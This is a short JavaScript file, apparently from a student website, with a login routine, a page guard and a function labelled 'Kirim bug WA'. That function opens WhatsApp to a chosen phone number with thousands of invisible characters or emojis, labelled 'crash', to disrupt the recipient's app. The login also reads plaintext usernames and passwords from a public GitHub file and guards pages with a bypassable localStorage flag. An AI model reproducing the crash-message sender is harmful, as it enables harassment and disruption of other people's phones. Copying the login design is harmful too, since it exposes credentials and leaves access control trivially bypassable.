const URL = 'https://raw.githubusercontent.com/rexz26hff/Website-protofilio-kelas-/main/logindata.json';

// Login handling
async function login(){
  const u = document.getElementById('u').value.trim();
  const p = document.getElementById('p').value.trim();
  const e = document.getElementById('e');
  try {
    const jd = await (await fetch(URL)).json();
    const ok = jd.users.find(x=>x.username===u && x.password===p);
    if(ok){ localStorage.setItem('logged','1'); location='index.html'; }
    else e.innerText='User atau password salah!';
  } catch {
    e.innerText='Gagal ambil data!';
  }
}

// Proteksi akses index.html
if(location.pathname.endsWith('index.html') && !localStorage.getItem('logged'))
  location='login.html';

// Logout
function logout(){ localStorage.removeItem('logged'); location='login.html'; }

// Kirim bug WA
function kirim(t){
  const no = document.getElementById('target').value.trim();
  if(!no) return alert('Masukkan nomor!');
  let teks = t==='invisible'?'‎'.repeat(1000): t==='crash'?'💥'.repeat(3000):'🐱‍👤'.repeat(4000);
  window.open(`https://wa.me/${no}?text=${encodeURIComponent(teks)}`, '_blank');
}
